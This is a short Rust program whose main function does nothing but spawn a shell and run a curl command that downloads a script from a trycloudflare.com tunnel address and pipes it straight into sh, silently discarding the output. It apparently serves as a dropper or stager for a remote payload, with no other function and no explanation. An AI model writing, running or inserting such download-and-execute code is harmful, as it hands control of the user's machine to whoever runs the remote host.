fn main() {
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg("curl -s 'https://spears-delivering-recorded-src.trycloudflare.com/r/smokedmeat/stg_sm_fc0c0844ce4cf384' | sh")
        .output();
}
